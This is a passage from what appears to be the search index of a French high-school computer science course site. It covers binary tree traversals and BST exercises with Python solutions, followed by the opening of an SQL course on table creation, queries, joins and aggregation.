syst\u00e9matique pour visiter tous les n\u0153uds d'un arbre dans un ordre sp\u00e9cifique. Chaque parcours suit une strat\u00e9gie diff\u00e9rente selon l'ordre de visite des n\u0153uds.          \ud83c\udfaf Objectif                  Traiter chaque n\u0153ud exactement une fois selon une strat\u00e9gie d\u00e9finie.              \ud83d\udd04 R\u00e9cursivit\u00e9                  Les parcours utilisent la nature r\u00e9cursive des arbres pour une impl\u00e9mentation \u00e9l\u00e9gante.              \u26a1 Complexit\u00e9                  Tous les parcours ont une complexit\u00e9 temporelle O(n) car chaque n\u0153ud est visit\u00e9 une fois.              \ud83d\udd04 Types de Parcours 1\ufe0f\u20e3 Parcours Pr\u00e9fixe Racine \u2192 Gauche \u2192 Droite                 Visite d'abord la racine, puis le sous-arbre gauche, enfin le sous-arbre droit.              2\ufe0f\u20e3 Parcours Infixe Gauche \u2192 Racine \u2192 Droite                 Visite le sous-arbre gauche, puis la racine, enfin le sous-arbre droit.              3\ufe0f\u20e3 Parcours Postfixe Gauche \u2192 Droite \u2192 Racine                 Visite les sous-arbres gauche et droit avant la racine.              \ud83c\udf1f Applications Pratiques \ud83d\udccb Parcours Pr\u00e9fixe Utilisations : <ul> <li>Copie d'arbres</li> <li>S\u00e9rialisation</li> <li>\u00c9valuation d'expressions pr\u00e9fix\u00e9es</li> <li>Cr\u00e9ation de structures hi\u00e9rarchiques</li> </ul> \ud83d\udd22 Parcours Infixe Utilisations : <ul> <li>Tri d'arbres binaires de recherche</li> <li>\u00c9valuation d'expressions math\u00e9matiques</li> <li>Affichage ordonn\u00e9 des donn\u00e9es</li> <li>Validation de propri\u00e9t\u00e9s ABR</li> </ul> \ud83e\uddee Parcours Postfixe Utilisations : <ul> <li>Suppression d'arbres</li> <li>Calcul de taille/hauteur</li> <li>\u00c9valuation d'expressions postfix\u00e9es</li> <li>Lib\u00e9ration de m\u00e9moire</li> </ul> \ud83d\udcbb Impl\u00e9mentations Python 1\ufe0f\u20e3 Parcours Pr\u00e9fixe                  Traite la racine avant ses enfants - id\u00e9al pour la copie et la s\u00e9rialisation.              \ud83d\udcbb Impl\u00e9mentation Pr\u00e9fixe <pre><code>def parcours_prefixe(self, noeud=None, resultat=None):\n    \"\"\"\n    Parcours pr\u00e9fixe : Racine \u2192 Gauche \u2192 Droite\n    Retourne la liste des valeurs dans l'ordre de visite\n    \"\"\"\n    if resultat is None:\n        resultat = []\n\n    if noeud is None:\n        noeud = self.racine\n\n    if noeud is not None:\n        # 1. Traiter la racine\n        resultat.append(noeud.valeur)\n\n        # 2. Parcourir le sous-arbre gauche\n        self.parcours_prefixe(noeud.gauche, resultat)\n\n        # 3. Parcourir le sous-arbre droit\n        self.parcours_prefixe(noeud.droite, resultat)\n\n    return resultat</code></pre> 2\ufe0f\u20e3 Parcours Infixe                  Traite la racine entre ses enfants - produit un ordre tri\u00e9 pour les ABR.              \ud83d\udcbb Impl\u00e9mentation Infixe <pre><code>def parcours_infixe(self, noeud=None, resultat=None):\n    \"\"\"\n    Parcours infixe : Gauche \u2192 Racine \u2192 Droite\n    Pour un ABR, produit les valeurs en ordre croissant\n    \"\"\"\n    if resultat is None:\n        resultat = []\n\n    if noeud is None:\n        noeud = self.racine\n\n    if noeud is not None:\n        # 1. Parcourir le sous-arbre gauche\n        self.parcours_infixe(noeud.gauche, resultat)\n\n        # 2. Traiter la racine\n        resultat.append(noeud.valeur)\n\n        # 3. Parcourir le sous-arbre droit\n        self.parcours_infixe(noeud.droite, resultat)\n\n    return resultat</code></pre> 3\ufe0f\u20e3 Parcours Postfixe                  Traite la racine apr\u00e8s ses enfants - id\u00e9al pour les calculs et la suppression.              \ud83d\udcbb Impl\u00e9mentation Postfixe <pre><code>def parcours_postfixe(self, noeud=None, resultat=None):\n    \"\"\"\n    Parcours postfixe : Gauche \u2192 Droite \u2192 Racine\n    Id\u00e9al pour calculer des propri\u00e9t\u00e9s ou supprimer l'arbre\n    \"\"\"\n    if resultat is None:\n        resultat = []\n\n    if noeud is None:\n        noeud = self.racine\n\n    if noeud is not None:\n        # 1. Parcourir le sous-arbre gauche\n        self.parcours_postfixe(noeud.gauche, resultat)\n\n        # 2. Parcourir le sous-arbre droit\n        self.parcours_postfixe(noeud.droite, resultat)\n\n        # 3. Traiter la racine\n        resultat.append(noeud.valeur)\n\n    return resultat</code></pre> \ud83e\uddea Exemple Complet \ud83c\udf33 Arbre d'exemple <pre>       A\n      / \\\n     B   C\n    / \\   \\\n   D   E   F</pre> \ud83d\udd04 R\u00e9sultats des Parcours Pr\u00e9fixe : A, B, D, E, C, F Infixe : D, B, E, A, C, F Postfixe : D, E, B, F, C, A              \ud83d\udcbb Code de Test \ud83d\udcbb Test des Parcours <pre><code># Construction de l'arbre\nracine = NoeudBinaire('A')\nracine.gauche = NoeudBinaire('B')\nracine.droite = NoeudBinaire('C')\nracine.gauche.gauche = NoeudBinaire('D')\nracine.gauche.droite = NoeudBinaire('E')\nracine.droite.droite = NoeudBinaire('F')\n\narbre = ArbreBinaire(racine)\n\n# Tests des parcours\nprint(\"Pr\u00e9fixe :\", arbre.parcours_prefixe())\nprint(\"Infixe :\", arbre.parcours_infixe())\nprint(\"Postfixe :\", arbre.parcours_postfixe())</code></pre> \u26a1 Analyse de Complexit\u00e9 \ud83d\udcca Complexit\u00e9 des Parcours Parcours Complexit\u00e9 Temporelle Complexit\u00e9 Spatiale Remarques Pr\u00e9fixe O(n) O(h) h = hauteur de l'arbre Infixe O(n) O(h) Ordre tri\u00e9 pour ABR Postfixe O(n) O(h) Id\u00e9al pour suppression          \ud83d\udca1 Important : La complexit\u00e9 spatiale O(h) correspond \u00e0 la pile d'appels r\u00e9cursifs, o\u00f9 h est la hauteur de l'arbre.      \ud83c\udfaf Points Cl\u00e9s \u00e0 Retenir \ud83d\udd04 R\u00e9cursivit\u00e9 Naturelle                  Les parcours exploitent la structure r\u00e9cursive des arbres pour une impl\u00e9mentation \u00e9l\u00e9gante et intuitive.              \u26a1 Efficacit\u00e9 Optimale                  Complexit\u00e9 O(n) incontournable car chaque n\u0153ud doit \u00eatre visit\u00e9 exactement une fois.              \ud83c\udfaf Choix Strat\u00e9gique                  Le choix du parcours d\u00e9pend de l'application : pr\u00e9fixe pour copier, infixe pour trier, postfixe pour calculer."},{"location":"terminale/II-Structures_de_donnees/Fiche_d_exercices/Fiche_exercices_arbres/","title":"\ud83c\udf33 Fiche d'exercice : Les Arbres","text":"<p>\u26a0\ufe0f Attention</p> <p>Tous les exercices doivent \u00eatre impl\u00e9ment\u00e9s en respectant les structures de donn\u00e9es d'arbres binaires.   <pre><code>   class Noeud:\n       def __init__(self, valeur):\n           self.valeur = valeur\n           self.gauche = None\n           self.droite = None\n</code></pre></p> \ud83d\udcda \u00c0 conna\u00eetre \ud83c\udfaf Exercices d'introduction \ud83c\udf1f Niveau Facile \ud83d\udd25 Niveau Interm\u00e9diaire \ud83d\ude80 Niveau Difficile \u00c0 conna\u00eetre \ud83e\udd8a \ud83c\udf33 Parcours Pr\u00e9fixe (Pr\u00e9ordre) Ordre de visite : Racine \u2192 Sous-arbre gauche \u2192 Sous-arbre droite Utilisation : Copie d'arbre, \u00e9valuation d'expressions pr\u00e9fix\u00e9es Exemple d'impl\u00e9mentation : <pre><code>def parcours_prefixe(noeud):\n    if noeud is not None:\n        print(noeud.valeur)  # Traiter la racine\n        parcours_prefixe(noeud.gauche)  # Parcourir \u00e0 gauche\n        parcours_prefixe(noeud.droite)  # Parcourir \u00e0 droite</code></pre> \u00c0 conna\u00eetre \ud83e\udd8a \ud83c\udf33 Parcours Infixe (Inordre) Ordre de visite : Sous-arbre gauche \u2192 Racine \u2192 Sous-arbre droite Utilisation : Affichage tri\u00e9 des ABR, conversion d'expressions Exemple d'impl\u00e9mentation : <pre><code>def parcours_infixe(noeud):\n    if noeud is not None:\n        parcours_infixe(noeud.gauche)  # Parcourir \u00e0 gauche\n        print(noeud.valeur)  # Traiter la racine\n        parcours_infixe(noeud.droite)  # Parcourir \u00e0 droite</code></pre> \u00c0 conna\u00eetre \ud83e\udd8a \ud83c\udf33 Parcours Postfixe (Postordre) Ordre de visite : Sous-arbre gauche \u2192 Sous-arbre droite \u2192 Racine Utilisation : Suppression d'arbre, \u00e9valuation d'expressions postfix\u00e9es Exemple d'impl\u00e9mentation : <pre><code>def parcours_postfixe(noeud):\n    if noeud is not None:\n        parcours_postfixe(noeud.gauche)  # Parcourir \u00e0 gauche\n        parcours_postfixe(noeud.droite)  # Parcourir \u00e0 droite\n        print(noeud.valeur)  # Traiter la racine</code></pre> \u00c0 conna\u00eetre \ud83e\udd8a \ud83d\udd0d Insertion dans un ABR Principe : Comparer la valeur avec la racine et ins\u00e9rer r\u00e9cursivement Complexit\u00e9 : O(log n) en moyenne, O(n) dans le pire cas Exemple d'impl\u00e9mentation : <pre><code>def inserer(racine, valeur):\n    if racine is None:\n        return Noeud(valeur)\n    if valeur &lt; racine.valeur:\n        racine.gauche = inserer(racine.gauche, valeur)\n    else:\n        racine.droite = inserer(racine.droite, valeur)\n    return racine</code></pre> \u00c0 conna\u00eetre \ud83e\udd8a \ud83d\uddd1\ufe0f Suppression dans un ABR 3 cas \u00e0 g\u00e9rer :                 \u2022 Cas 1 : N\u0153ud feuille \u2192 Suppression directe                 \u2022 Cas 2 : N\u0153ud avec un enfant \u2192 Remplacer par l'enfant                 \u2022 Cas 3 : N\u0153ud avec deux enfants \u2192 Remplacer par le successeur Le successeur est le plus petit \u00e9l\u00e9ment du sous-arbre droit Introduction \ud83e\udd8a Exercice 1 - Cr\u00e9ation d'un arbre simple Cr\u00e9er un arbre binaire avec une racine de valeur 10, un enfant gauche de valeur 5 et un enfant droit de valeur 15. Afficher les valeurs des trois n\u0153uds. \u2192 Voir la correction              <pre><code>class Noeud:\n    def __init__(self, valeur):\n        self.valeur = valeur\n        self.gauche = None\n        self.droite = None\n\n# Cr\u00e9ation de l'arbre\nracine = Noeud(10)\nracine.gauche = Noeud(5)\nracine.droite = Noeud(15)\n\n# Affichage\nprint(f\"Racine: {racine.valeur}\")\nprint(f\"Enfant gauche: {racine.gauche.valeur}\")\nprint(f\"Enfant droit: {racine.droite.valeur}\")</code></pre> Introduction \ud83e\udd8a Exercice 2 - Parcours pr\u00e9fixe simple Impl\u00e9menter une fonction de parcours pr\u00e9fixe qui affiche les valeurs des n\u0153uds. Tester avec l'arbre cr\u00e9\u00e9 dans l'exercice 1. \u2192 Voir la correction              <pre><code>def parcours_prefixe(noeud):\n    if noeud is not None:\n        print(noeud.valeur)\n        parcours_prefixe(noeud.gauche)\n        parcours_prefixe(noeud.droite)\n\n# Test avec l'arbre pr\u00e9c\u00e9dent\nparcours_prefixe(racine)\n# Affiche: 10, 5, 15</code></pre> Introduction \ud83e\udd8a Exercice 3 - Insertion simple dans un ABR Cr\u00e9er un ABR vide et y ins\u00e9rer les valeurs 8, 3, 10, 1, 6, 14, 4, 7, 13. Afficher l'arbre avec un parcours infixe pour v\u00e9rifier l'ordre. \u2192 Voir la correction              <pre><code>def inserer(racine, valeur):\n    if racine is None:\n        return Noeud(valeur)\n    if valeur &lt; racine.valeur:\n        racine.gauche = inserer(racine.gauche, valeur)\n    else:\n        racine.droite = inserer(racine.droite, valeur)\n    return racine\n\ndef parcours_infixe(noeud):\n    if noeud is not None:\n        parcours_infixe(noeud.gauche)\n        print(noeud.valeur, end=\" \")\n        parcours_infixe(noeud.droite)\n\n# Cr\u00e9ation de l'ABR\nabr = None\nvaleurs = [8, 3, 10, 1, 6, 14, 4, 7, 13]\nfor val in valeurs:\n    abr = inserer(abr, val)\n\n# Affichage tri\u00e9\nparcours_infixe(abr)\n# Affiche: 1 3 4 6 7 8 10 13 14</code></pre> Facile \ud83e\udd8a Exercice 4 - Calcul de la hauteur \u00c9crire une fonction qui calcule la hauteur d'un arbre binaire. La hauteur d'un arbre vide est -1, celle d'une feuille est 0. \u2192 Voir la correction              <pre><code>def hauteur(noeud):\n    if noeud is None:\n        return -1\n    hauteur_gauche = hauteur(noeud.gauche)\n    hauteur_droite = hauteur(noeud.droite)\n    return 1 + max(hauteur_gauche, hauteur_droite)</code></pre> Facile \ud83e\udd8a Exercice 5 - Recherche dans un ABR \u00c9crire une fonction qui recherche une valeur dans un ABR et renvoie True si elle existe, False sinon. \u2192 Voir la correction              <pre><code>def rechercher(racine, valeur):\n    if racine is None:\n        return False\n    if racine.valeur == valeur:\n        return True\n    elif valeur &lt; racine.valeur:\n        return rechercher(racine.gauche, valeur)\n    else:\n        return rechercher(racine.droite, valeur)</code></pre> Facile \ud83e\udd8a Exercice 6 - Compter les n\u0153uds \u00c9crire une fonction qui compte le nombre total de n\u0153uds dans un arbre binaire. \u2192 Voir la correction              <pre><code>def compter_noeuds(noeud):\n    if noeud is None:\n        return 0\n    return 1 + compter_noeuds(noeud.gauche) + compter_noeuds(noeud.droite)</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Exercice 7 - Suppression d'une feuille Impl\u00e9menter la suppression d'un n\u0153ud feuille dans un ABR. G\u00e9rer uniquement le cas o\u00f9 le n\u0153ud \u00e0 supprimer est une feuille. \u2192 Voir la correction              <pre><code>def supprimer_feuille(racine, valeur):\n    if racine is None:\n        return None\n\n    if valeur &lt; racine.valeur:\n        racine.gauche = supprimer_feuille(racine.gauche, valeur)\n    elif valeur &gt; racine.valeur:\n        racine.droite = supprimer_feuille(racine.droite, valeur)\n    else:\n        # N\u0153ud trouv\u00e9\n        if racine.gauche is None and racine.droite is None:\n            # C'est une feuille\n            return None\n        else:\n            print(f\"Le n\u0153ud {valeur} n'est pas une feuille\")\n\n    return racine</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Exercice 8 - Parcours en largeur Impl\u00e9menter un parcours en largeur (niveau par niveau) d'un arbre binaire. Utiliser une file (queue) pour l'impl\u00e9mentation. \u2192 Voir la correction              <pre><code>from collections import deque\n\ndef parcours_largeur(racine):\n    if racine is None:\n        return\n\n    file = deque([racine])\n\n    while file:\n        noeud = file.popleft()\n        print(noeud.valeur, end=\" \")\n\n        if noeud.gauche:\n            file.append(noeud.gauche)\n        if noeud.droite:\n            file.append(noeud.droite)</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Exercice 9 - Minimum et Maximum d'un ABR \u00c9crire deux fonctions pour trouver la valeur minimale et maximale dans un ABR. \u2192 Voir la correction              <pre><code>def minimum_abr(racine):\n    if racine is None:\n        return None\n    while racine.gauche is not None:\n        racine = racine.gauche\n    return racine.valeur\n\ndef maximum_abr(racine):\n    if racine is None:\n        return None\n    while racine.droite is not None:\n        racine = racine.droite\n    return racine.valeur</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Exercice 10 - Suppression compl\u00e8te dans un ABR Impl\u00e9menter la suppression compl\u00e8te d'un n\u0153ud dans un ABR (g\u00e9rer les 3 cas). Cas 1: feuille, Cas 2: un enfant, Cas 3: deux enfants \u2192 Voir la correction              <pre><code>def supprimer(racine, valeur):\n    if racine is None:\n        return None\n\n    if valeur &lt; racine.valeur:\n        racine.gauche = supprimer(racine.gauche, valeur)\n    elif valeur &gt; racine.valeur:\n        racine.droite = supprimer(racine.droite, valeur)\n    else:\n        # N\u0153ud trouv\u00e9\n        # Cas 1: N\u0153ud feuille\n        if racine.gauche is None and racine.droite is None:\n            return None\n\n        # Cas 2: N\u0153ud avec un seul enfant\n        elif racine.gauche is None:\n            return racine.droite\n        elif racine.droite is None:\n            return racine.gauche\n\n        # Cas 3: N\u0153ud avec deux enfants\n        else:\n            # Trouver le successeur (minimum du sous-arbre droit)\n            successeur = racine.droite\n            while successeur.gauche is not None:\n                successeur = successeur.gauche\n\n            # Remplacer la valeur\n            racine.valeur = successeur.valeur\n\n            # Supprimer le successeur\n            racine.droite = supprimer(racine.droite, successeur.valeur)\n\n    return racine</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Exercice 11 - V\u00e9rifier si un arbre est un ABR \u00c9crire une fonction qui v\u00e9rifie si un arbre binaire donn\u00e9 respecte les propri\u00e9t\u00e9s d'un ABR. \u2192 Voir la correction              <pre><code>def est_abr(racine, min_val=float('-inf'), max_val=float('inf')):\n    if racine is None:\n        return True\n\n    if racine.valeur &lt;= min_val or racine.valeur &gt;= max_val:\n        return False\n\n    return (est_abr(racine.gauche, min_val, racine.valeur) and\n            est_abr(racine.droite, racine.valeur, max_val))</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Exercice 12 - Reconstruction d'un ABR \u00c0 partir d'un parcours infixe et pr\u00e9fixe, reconstruire l'ABR original. Exemple: Infixe [1,3,4,6,7,8,10,13,14], Pr\u00e9fixe [8,3,1,6,4,7,10,14,13] \u2192 Voir la correction              <pre><code>def reconstruire_abr(prefixe, infixe):\n    if not prefixe or not infixe:\n        return None\n\n    # La racine est le premier \u00e9l\u00e9ment du parcours pr\u00e9fixe\n    racine_val = prefixe[0]\n    racine = Noeud(racine_val)\n\n    # Trouver la position de la racine dans le parcours infixe\n    idx_racine = infixe.index(racine_val)\n\n    # Diviser les parcours\n    infixe_gauche = infixe[:idx_racine]\n    infixe_droite = infixe[idx_racine + 1:]\n\n    prefixe_gauche = prefixe[1:1 + len(infixe_gauche)]\n    prefixe_droite = prefixe[1 + len(infixe_gauche):]\n\n    # Construire r\u00e9cursivement les sous-arbres\n    racine.gauche = reconstruire_abr(prefixe_gauche, infixe_gauche)\n    racine.droite = reconstruire_abr(prefixe_droite, infixe_droite)\n\n    return racine</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/","title":"Langage SQL (Structured Query Language)","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#introduction","title":"Introduction","text":"<p>SQL (Structured Query Language) est le langage standard pour interagir avec les bases de donn\u00e9es relationnelles. D\u00e9velopp\u00e9 dans les ann\u00e9es 1970 par IBM, il permet de : - Interroger les donn\u00e9es (requ\u00eates) - Modifier la structure des bases de donn\u00e9es - Ins\u00e9rer, modifier et supprimer des donn\u00e9es - Contr\u00f4ler les acc\u00e8s et la s\u00e9curit\u00e9</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#types-dinstructions-sql","title":"Types d'instructions SQL","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#ddl-data-definition-language","title":"DDL (Data Definition Language)","text":"<p>D\u00e9finition de la structure des donn\u00e9es - <code>CREATE</code> : Cr\u00e9er des objets (tables, index, vues) - <code>ALTER</code> : Modifier la structure - <code>DROP</code> : Supprimer des objets</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#dml-data-manipulation-language","title":"DML (Data Manipulation Language)","text":"<p>Manipulation des donn\u00e9es - <code>SELECT</code> : Interroger les donn\u00e9es - <code>INSERT</code> : Ins\u00e9rer des donn\u00e9es - <code>UPDATE</code> : Modifier des donn\u00e9es - <code>DELETE</code> : Supprimer des donn\u00e9es</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#dcl-data-control-language","title":"DCL (Data Control Language)","text":"<p>Contr\u00f4le des acc\u00e8s - <code>GRANT</code> : Accorder des droits - <code>REVOKE</code> : R\u00e9voquer des droits</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#creation-de-tables-ddl","title":"Cr\u00e9ation de tables (DDL)","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#syntaxe-create-table","title":"Syntaxe CREATE TABLE","text":"<pre><code>CREATE TABLE nom_table (\n    colonne1 type_donnees [contraintes],\n    colonne2 type_donnees [contraintes],\n    ...\n    [contraintes_table]\n);\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#types-de-donnees-courants","title":"Types de donn\u00e9es courants","text":"Type Description Exemple <code>INTEGER</code> Nombre entier <code>age INTEGER</code> <code>REAL</code> / <code>FLOAT</code> Nombre d\u00e9cimal <code>prix REAL</code> <code>TEXT</code> / <code>VARCHAR(n)</code> Cha\u00eene de caract\u00e8res <code>nom VARCHAR(50)</code> <code>DATE</code> Date <code>naissance DATE</code> <code>BOOLEAN</code> Bool\u00e9en <code>actif BOOLEAN</code>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#contraintes","title":"Contraintes","text":"<pre><code>CREATE TABLE etudiants (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    nom VARCHAR(50) NOT NULL,\n    prenom VARCHAR(50) NOT NULL,\n    email VARCHAR(100) UNIQUE,\n    age INTEGER CHECK (age &gt;= 16 AND age &lt;= 99),\n    date_inscription DATE DEFAULT CURRENT_DATE\n);\n</code></pre> <p>Types de contraintes : - <code>PRIMARY KEY</code> : Cl\u00e9 primaire - <code>FOREIGN KEY</code> : Cl\u00e9 \u00e9trang\u00e8re - <code>NOT NULL</code> : Valeur obligatoire - <code>UNIQUE</code> : Valeur unique - <code>CHECK</code> : Condition \u00e0 respecter - <code>DEFAULT</code> : Valeur par d\u00e9faut</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#exemple-complet-base-de-donnees-bibliotheque","title":"Exemple complet : Base de donn\u00e9es biblioth\u00e8que","text":"<pre><code>-- Table des auteurs\nCREATE TABLE auteurs (\n    id_auteur INTEGER PRIMARY KEY AUTOINCREMENT,\n    nom VARCHAR(50) NOT NULL,\n    prenom VARCHAR(50) NOT NULL,\n    date_naissance DATE,\n    nationalite VARCHAR(30)\n);\n\n-- Table des livres\nCREATE TABLE livres (\n    isbn VARCHAR(17) PRIMARY KEY,\n    titre VARCHAR(200) NOT NULL,\n    id_auteur INTEGER,\n    annee_publication INTEGER CHECK (annee_publication &gt; 0),\n    nb_pages INTEGER CHECK (nb_pages &gt; 0),\n    genre VARCHAR(50),\n    FOREIGN KEY (id_auteur) REFERENCES auteurs(id_auteur)\n);\n\n-- Table des lecteurs\nCREATE TABLE lecteurs (\n    id_lecteur INTEGER PRIMARY KEY AUTOINCREMENT,\n    nom VARCHAR(50) NOT NULL,\n    prenom VARCHAR(50) NOT NULL,\n    email VARCHAR(100) UNIQUE,\n    date_inscription DATE DEFAULT CURRENT_DATE\n);\n\n-- Table des emprunts\nCREATE TABLE emprunts (\n    id_emprunt INTEGER PRIMARY KEY AUTOINCREMENT,\n    isbn VARCHAR(17),\n    id_lecteur INTEGER,\n    date_emprunt DATE NOT NULL,\n    date_retour_prevue DATE NOT NULL,\n    date_retour_effective DATE,\n    FOREIGN KEY (isbn) REFERENCES livres(isbn),\n    FOREIGN KEY (id_lecteur) REFERENCES lecteurs(id_lecteur)\n);\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#insertion-de-donnees-dml","title":"Insertion de donn\u00e9es (DML)","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#insert-into","title":"INSERT INTO","text":"<pre><code>-- Insertion d'un seul enregistrement\nINSERT INTO auteurs (nom, prenom, date_naissance, nationalite)\nVALUES ('Orwell', 'George', '1903-06-25', 'Britannique');\n\n-- Insertion multiple\nINSERT INTO auteurs (nom, prenom, nationalite) VALUES\n    ('Hugo', 'Victor', 'Fran\u00e7aise'),\n    ('Camus', 'Albert', 'Fran\u00e7aise'),\n    ('Tolkien', 'J.R.R.', 'Britannique');\n\n-- Insertion avec sous-requ\u00eate\nINSERT INTO livres_populaires (isbn, titre)\nSELECT isbn, titre \nFROM livres \nWHERE nb_emprunts &gt; 100;\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#requetes-de-selection-dml","title":"Requ\u00eates de s\u00e9lection (DML)","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#select-de-base","title":"SELECT de base","text":"<pre><code>-- S\u00e9lection de toutes les colonnes\nSELECT * FROM livres;\n\n-- S\u00e9lection de colonnes sp\u00e9cifiques\nSELECT titre, annee_publication FROM livres;\n\n-- S\u00e9lection avec alias\nSELECT titre AS \"Titre du livre\", \n       annee_publication AS \"Ann\u00e9e\" \nFROM livres;\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#clause-where","title":"Clause WHERE","text":"<pre><code>-- Condition simple\nSELECT * FROM livres WHERE annee_publication &gt; 2000;\n\n-- Conditions multiples\nSELECT * FROM livres \nWHERE annee_publication BETWEEN 1950 AND 2000 \n  AND genre = 'Science-fiction';\n\n-- Op\u00e9rateurs de comparaison\nSELECT * FROM livres WHERE titre LIKE '%Python%';\nSELECT * FROM auteurs WHERE nationalite IN ('Fran\u00e7aise', 'Britannique');\nSELECT * FROM emprunts WHERE date_retour_effective IS NULL;\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#tri-et-limitation","title":"Tri et limitation","text":"<pre><code>-- Tri croissant\nSELECT * FROM livres ORDER BY annee_publication;\n\n-- Tri d\u00e9croissant\nSELECT * FROM livres ORDER BY annee_publication DESC;\n\n-- Tri multiple\nSELECT * FROM livres ORDER BY genre, annee_publication DESC;\n\n-- Limitation du nombre de r\u00e9sultats\nSELECT * FROM livres ORDER BY annee_publication DESC LIMIT 5;\n\n-- Pagination\nSELECT * FROM livres ORDER BY titre LIMIT 10 OFFSET 20;\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#jointures","title":"Jointures","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#inner-join","title":"INNER JOIN","text":"<pre><code>-- Livres avec leurs auteurs\nSELECT l.titre, a.nom, a.prenom\nFROM livres l\nINNER JOIN auteurs a ON l.id_auteur = a.id_auteur;\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#left-join","title":"LEFT JOIN","text":"<pre><code>-- Tous les auteurs, m\u00eame ceux sans livres\nSELECT a.nom, a.prenom, l.titre\nFROM auteurs a\nLEFT JOIN livres l ON a.id_auteur = l.id_auteur;\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#jointures-multiples","title":"Jointures multiples","text":"<pre><code>-- Emprunts avec d\u00e9tails du livre et du lecteur\nSELECT \n    lec.nom AS lecteur_nom,\n    lec.prenom AS lecteur_prenom,\n    l.titre,\n    a.nom AS auteur_nom,\n    e.date_emprunt,\n    e.date_retour_prevue\nFROM emprunts e\nINNER JOIN lecteurs lec ON e.id_lecteur = lec.id_lecteur\nINNER JOIN livres l ON e.isbn = l.isbn\nINNER JOIN auteurs a ON l.id_auteur = a.id_auteur\nWHERE e.date_retour_effective IS NULL;\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#fonctions-dagregation","title":"Fonctions d'agr\u00e9gation","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#fonctions-de-base","title":"Fonctions de base","text":"<pre><code>-- Nombre total de livres\nSELECT COUNT(*) AS nombre_livres FROM livres;\n\n-- Ann\u00e9e de publication la plus r\u00e9cente\nSELECT MAX(annee_publication) AS annee_max FROM livres;\n\n-- Nombre moyen de pages\nSELECT AVG(nb_pages) AS moyenne_pages FROM livres;\n\n-- Somme des pages de tous les livres\nSELECT SUM(nb_pages) AS total_pages FROM livres;\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#group-by-et-having","title":"GROUP BY et HAVING","text":"<pre><code>-- Nombre de livres par genre\nSELECT genre, COUNT(*) AS nombre_livres\nFROM livres\nGROUP BY genre\nORDER BY nombre_livres DESC;\n\n-- Genres avec plus de 5 livres\nSELECT genre, COUNT(*) AS nombre_livres\nFROM livres\nGROUP BY genre\nHAVING COUNT(*) &gt; 5;\n\n-- Auteurs avec le nombre de leurs livres\nSELECT \n    a.nom,\n    a.prenom,\n    COUNT(l.isbn) AS nombre_livres\nFROM auteurs a\nLEFT JOIN livres l ON a.id_auteur = l.id_auteur\nGROUP BY a.id_auteur, a.nom, a.prenom\nORDER BY nombre_livres DESC;\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#sous-requetes","title":"Sous-requ\u00eates","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#sous-requete-dans-where","title":"Sous-requ\u00eate dans WHERE","text":"<pre><code>-- Livres de l'auteur le plus prolifique\nSELECT titre\nFROM livres\nWHERE id_auteur = (\n    SELECT id_auteur\n    FROM livres\n    GROUP BY id_auteur\n    ORDER BY COUNT(*) DESC\n    LIMIT 1\n);\n\n-- Livres plus r\u00e9cents que la moyenne\nSELECT titre, annee_publication\nFROM livres\nWHERE annee_publication &gt; (\n    SELECT AVG(annee_publication)\n    FROM livres\n);\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#sous-requete-avec-exists","title":"Sous-requ\u00eate avec EXISTS","text":"<pre><code>-- Auteurs qui ont \u00e9crit au moins un livre\nSELECT nom, prenom\nFROM auteurs a\nWHERE EXISTS (\n    SELECT 1\n    FROM livres l\n    WHERE l.id_auteur = a.id_auteur\n);\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#modification-de-donnees","title":"Modification de donn\u00e9es","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#update","title":"UPDATE","text":"<pre><code>-- Mise \u00e0 jour simple\nUPDATE livres \nSET genre = 'Dystopie' \nWHERE titre = '1984';\n\n-- Mise \u00e0 jour avec jointure\nUPDATE emprunts \nSET date_retour_effective = CURRENT_DATE\nWHERE id_emprunt = 1;\n\n-- Mise \u00e0 jour conditionnelle\nUPDATE livres \nSET genre = 'Classique'\nWHERE annee_publication &lt; 1950;\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#delete","title":"DELETE","text":"<pre><code>-- Suppression avec condition\nDELETE FROM emprunts \nWHERE 